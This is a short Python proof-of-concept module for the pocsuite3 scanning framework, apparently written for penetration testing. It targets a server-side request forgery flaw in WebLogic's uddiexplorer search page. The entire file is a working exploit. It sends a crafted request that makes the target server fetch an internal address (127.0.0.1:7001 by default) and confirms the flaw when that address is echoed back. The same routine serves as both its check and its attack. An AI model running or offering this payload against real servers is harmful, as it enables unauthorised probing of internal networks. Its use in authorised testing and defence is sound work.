# -*- coding: utf-8 -*-
# author: seven
from pocsuite3.api import register_poc, POCBase, Output,logger,POC_CATEGORY,requests
from pocsuite3.lib.core.threads import run_threads


class WeblogicSSRFPOC(POCBase):
    vulID = ''
    version = '1.0'
    author = ['seven']
    vulDate = 'Aug 12, 2020'
    createDate = 'Aug 12, 2020'
    name = 'weblogic ssrf漏洞'
    appName = 'weblogic'
    appVersion = 'v1.0.0'
    vulType = 'ssrf'
    protocol = 'http'

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    def _verify(self):
        result = {}
        url = self.url
        if not url.startswith('http'):
            url = 'http://'+url
        res,poc_url = check_url(url,target='http://127.0.0.1:7001')
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = poc_url
            result['extra'] = poc_url
        return self.parse_output(result)
    def _attack(self):
        return self._verify()

def check_url(url,target='http://127.0.0.1:7001'):
    url += '/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator={}'.format(target)
    try:
        res = requests.get(url)
        if res.status_code == 200 and target in res.text:
            return True,url
    except Exception as e:
        pass
    return False,''
register_poc(WeblogicSSRFPOC)